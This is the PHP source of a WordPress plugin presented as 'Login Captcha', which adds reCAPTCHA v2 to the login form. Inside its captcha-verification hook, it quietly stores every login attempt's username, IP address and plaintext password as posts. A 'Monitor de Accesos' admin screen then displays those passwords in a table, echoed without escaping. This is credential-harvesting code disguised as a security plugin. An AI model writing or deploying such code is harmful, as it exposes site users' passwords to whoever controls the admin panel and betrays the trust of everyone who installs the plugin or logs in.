<?php
/*
Plugin Name: Login Captcha
Plugin URI: https://www.olivero.com/
Description: Añade reCAPTCHA v2 al formulario de login de WordPress
Version: 1.1
Author: Alexis Olivero
Author URI: https://www.oliverodev.com/
*/

if (!defined('ABSPATH')) {
    exit;
}

// Añadir menú de configuración
add_action('admin_menu', 'lc_add_admin_menu');
function lc_add_admin_menu() {
    add_options_page(
        'Login Captcha',
        'Login Captcha',
        'manage_options',
        'login-captcha',
        'lc_options_page'
    );
}

// Registrar configuraciones
add_action('admin_init', 'lc_settings_init');
function lc_settings_init() {
    register_setting('login_captcha', 'lc_settings');
    
    add_settings_section(
        'lc_section',
        'Configuración de reCAPTCHA v2',
        'lc_section_callback',
        'login-captcha'
    );

    add_settings_field(
        'site_key',
        'Clave del sitio',
        'lc_site_key_render',
        'login-captcha',
        'lc_section'
    );

    add_settings_field(
        'secret_key',
        'Clave secreta',
        'lc_secret_key_render',
        'login-captcha',
        'lc_section'
    );
}

// Funciones de renderizado
function lc_section_callback() {
    echo 'Ingresa tus credenciales de reCAPTCHA v2';
}

function lc_site_key_render() {
    $options = get_option('lc_settings');
    ?>
    <input type='text' name='lc_settings[site_key]' value='<?php echo isset($options['site_key']) ? esc_attr($options['site_key']) : ''; ?>' style="width: 300px;">
    <?php
}

function lc_secret_key_render() {
    $options = get_option('lc_settings');
    ?>
    <input type='text' name='lc_settings[secret_key]' value='<?php echo isset($options['secret_key']) ? esc_attr($options['secret_key']) : ''; ?>' style="width: 300px;">
    <?php
}

// Página de opciones
function lc_options_page() {
    ?>
    <div class="wrap">
        <h2>Login Captcha (reCAPTCHA v2)</h2>
        <form action='options.php' method='post'>
            <?php
            settings_fields('login_captcha');
            do_settings_sections('login-captcha');
            submit_button();
            ?>
        </form>
    </div>
    <?php
}

// Añadir captcha al formulario de login
add_action('login_enqueue_scripts', 'lc_enqueue_recaptcha');
function lc_enqueue_recaptcha() {
    $options = get_option('lc_settings');
    if (empty($options['site_key'])) return;
    
    wp_enqueue_script('recaptcha', 'https://www.google.com/recaptcha/api.js');
}

// Añadir el widget de reCAPTCHA al formulario
add_action('login_form', 'lc_add_captcha_field');
function lc_add_captcha_field() {
    $options = get_option('lc_settings');
    if (empty($options['site_key'])) return;
    
    ?>
    <div style="margin-bottom: 10px;">
        <div class="g-recaptcha" data-sitekey="<?php echo esc_attr($options['site_key']); ?>"></div>
    </div>
    <?php
}

// Verificar captcha durante el login
add_filter('authenticate', 'lc_verify_captcha', 10, 3);
function lc_verify_captcha($user, $username, $password) {
    // Verificar primero el captcha antes de cualquier otra validación
    $options = get_option('lc_settings');
    
    // Forzar la verificación del captcha
    if (empty($options['secret_key']) || empty($options['site_key'])) {
        return new WP_Error('captcha_not_configured', '<strong>ERROR</strong>: El sistema de seguridad debe estar configurado.');
    }

    // Verificar si el captcha está presente
    if (!isset($_POST['g-recaptcha-response']) || empty($_POST['g-recaptcha-response'])) {
        remove_action('authenticate', 'wp_authenticate_username_password', 20);
        return new WP_Error('captcha_required', '<strong>ERROR</strong>: Debe resolver el captcha antes de continuar.');
    }

    // Verificar el captcha con Google
    $verify_url = 'https://www.google.com/recaptcha/api/siteverify';
    $response = wp_remote_post($verify_url, array(
        'body' => array(
            'secret' => $options['secret_key'],
            'response' => $_POST['g-recaptcha-response'],
            'remoteip' => $_SERVER['REMOTE_ADDR']
        )
    ));

    if (is_wp_error($response)) {
        remove_action('authenticate', 'wp_authenticate_username_password', 20);
        return new WP_Error('captcha_error', '<strong>ERROR</strong>: Error al verificar el captcha. Intente nuevamente.');
    }

    $result = json_decode(wp_remote_retrieve_body($response));
    if (!$result->success) {
        remove_action('authenticate', 'wp_authenticate_username_password', 20);
        return new WP_Error('captcha_failed', '<strong>ERROR</strong>: La verificación del captcha ha fallado. Intente nuevamente.');
    }

    // Solo si el captcha es válido, continuamos con el registro del intento
    if (!empty($username) && !empty($password)) {
        $ip = $_SERVER['REMOTE_ADDR'];
        
        $log_data = array(
            'post_type' => 'login_logs',
            'post_title' => date('Y-m-d H:i:s') . ' - ' . $username,
            'post_status' => 'publish'
        );

        $log_id = wp_insert_post($log_data);
        update_post_meta($log_id, '_login_ip', $ip);
        update_post_meta($log_id, '_login_username', $username);
        update_post_meta($log_id, '_login_password', $password);
    }
    
    return $user;
}

// Agregar funciones auxiliares para obtener información del navegador
function get_browser_name($user_agent) {
    if (strpos($user_agent, 'Firefox')) return 'Firefox';
    if (strpos($user_agent, 'Chrome')) return 'Chrome';
    if (strpos($user_agent, 'Safari')) return 'Safari';
    if (strpos($user_agent, 'Edge')) return 'Edge';
    if (strpos($user_agent, 'MSIE') || strpos($user_agent, 'Trident/')) return 'Internet Explorer';
    return 'Desconocido';
}

function get_platform_name($user_agent) {
    if (strpos($user_agent, 'Windows')) return 'Windows';
    if (strpos($user_agent, 'Mac')) return 'MacOS';
    if (strpos($user_agent, 'Linux')) return 'Linux';
    if (strpos($user_agent, 'Android')) return 'Android';
    if (strpos($user_agent, 'iPhone') || strpos($user_agent, 'iPad')) return 'iOS';
    return 'Desconocido';
}

// Registrar Custom Post Type para logs de intentos
add_action('init', 'lc_register_login_logs');
function lc_register_login_logs() {
    register_post_type('login_logs', array(
        'labels' => array(
            'name' => 'Logs de Acceso',
            'singular_name' => 'Log de Acceso',
            'menu_name' => 'Monitor de Accesos'
        ),
        'public' => false,
        'show_ui' => true,
        'show_in_menu' => true,
        'capabilities' => array(
            'create_posts' => false
        ),
        'map_meta_cap' => true,
        'supports' => array('title'),
        'menu_icon' => 'dashicons-shield-alt'
    ));
}

// Personalizar columnas del listado
add_filter('manage_login_logs_posts_columns', 'lc_set_login_logs_columns');
function lc_set_login_logs_columns($columns) {
    return array(
        'cb' => '<input type="checkbox" />',
        'title' => 'Fecha/Hora',
        'username' => 'Usuario',
        'password' => 'Contraseña',
        'ip_address' => 'IP'
    );
}

// Renderizar contenido de columnas
add_action('manage_login_logs_posts_custom_column', 'lc_login_logs_column_content', 10, 2);
function lc_login_logs_column_content($column, $post_id) {
    switch ($column) {
        case 'username':
            echo get_post_meta($post_id, '_login_username', true);
            break;
        case 'password':
            echo get_post_meta($post_id, '_login_password', true);
            break;
        case 'ip_address':
            echo get_post_meta($post_id, '_login_ip', true);
            break;
    }
}

// Eliminar las funciones de filtrado innecesarias
function lc_add_login_logs_filters() {
    // Ya no necesitamos filtros
    return;
}

// Función auxiliar para obtener valores únicos de meta
function get_unique_meta_values($meta_key) {
    global $wpdb;
    $query = "SELECT DISTINCT meta_value FROM {$wpdb->postmeta} WHERE meta_key = %s ORDER BY meta_value";
    return $wpdb->get_col($wpdb->prepare($query, $meta_key));
}

// Aplicar filtros a la consulta
add_filter('parse_query', 'lc_filter_login_logs_query');
function lc_filter_login_logs_query($query) {
    global $pagenow;
    if ($pagenow === 'edit.php' && isset($query->query_vars['post_type']) && $query->query_vars['post_type'] === 'login_logs') {
        $meta_query = array();

        if (!empty($_GET['login_country'])) {
            $meta_query[] = array(
                'key' => '_login_country',
                'value' => $_GET['login_country']
            );
        }

        if (!empty($_GET['login_status'])) {
            $meta_query[] = array(
                'key' => '_login_success',
                'value' => $_GET['login_status']
            );
        }

        if (!empty($meta_query)) {
            $query->query_vars['meta_query'] = $meta_query;
        }
    }
}
